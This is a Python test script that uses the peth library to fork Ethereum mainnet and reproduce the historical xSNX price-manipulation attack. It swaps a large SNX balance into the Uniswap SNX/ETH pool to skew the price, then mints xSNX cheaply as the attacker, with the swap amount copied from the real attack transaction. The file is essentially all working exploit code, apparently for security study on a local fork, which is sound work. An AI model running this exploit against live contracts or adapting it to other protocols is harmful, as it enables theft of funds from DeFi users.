from web3 import Web3

from peth import Peth
from peth.eth.evm.chain import Chain
from peth.eth.evm.contract import ERC20, Contract
from peth.eth.evm.forkchain import ForkChain

web3 = Peth.get_or_create("eth").web3

chain = Chain(ForkChain(web3, 12419917))  # xSNXa attack
chain.use_as_default()

xSNX = ERC20("0x2367012AB9C3DA91290F71590D5CE217721EEFE4")

wETH = ERC20("0xC02AAA39B223FE8D0A0E5C4F27EAD9083C756CC2")
SNX = ERC20("0xC011A73EE8576FB46F5E1C5751CA3B9FE0AF2A6F")

router = Contract(
    "0x7A250D5630B4CF539739DF2C5DACB4C659F2488D",
    [
        "swapExactETHForTokens(uint256, address[], address, uint256) -> (uint256[])",
        "swapETHForExactTokens(uint256, address[], address, uint256) -> (uint256[])",
        "swapExactTokensForETH(uint256,uint256,address[],address,uint256) ->(uint256[])",
    ],
)

xSNX_holder = "0xE3F9CF7D44488715361581DD8B3A15379953EB4C"
SNX_holder = "0x5FD79D46EBA7F351FE49BFF9E87CDEA6C821EF9F"
ETH_SNX_UNIV2 = "0x43AE24960E5534731FC831386C07755A2DC33D47"


def swapSNXtoETH(amount_in):
    amount_in = int(amount_in)
    SNX.approve(router.address, amount_in)
    r = router.swapExactTokensForETH(
        amount_in, 0, [SNX.address, wETH.address], chain.attacker, chain.timestamp + 100
    )
    assert r.success

    snx_in, eth_out = router.swapExactTokensForETH.abi.decode_output(r.returndata)
    print(
        "Swap %0.2f SNX to %0.2f ETH"
        % (snx_in / (10 ** SNX.decimals()), eth_out / (10**18))
    )


def mintxSNX(value):
    before = xSNX.balanceOf(chain.attacker)
    r = xSNX.send("mint(uint256) payable", 0, value=Web3.to_wei(value, "ether"))
    print(r)
    assert r.success
    after = xSNX.balanceOf(chain.attacker)
    print(
        "Mint %0.2f ETH to %0.2f xSNX"
        % (value, (after - before) / (10 ** xSNX.decimals()))
    )


def test_xsnx():
    # Only need 0.2 ETH.
    chain.set_balance(chain.attacker, 0.2)

    # Get SNX from SNX_holder instead of flash loan.
    SNX.force_transfer(SNX_holder, chain.attacker, SNX.balanceOf(SNX_holder))

    # magic value copied from https://versatile.blocksecteam.com/tx/eth/0x7cc7d935d895980cdd905b2a134597fb91004b5d551d6db0fb265e3d9840da22
    swapSNXtoETH(1264381606870826302127890)

    # smaller one earns more, but may revert due to overflow.
    mintxSNX(0.125)
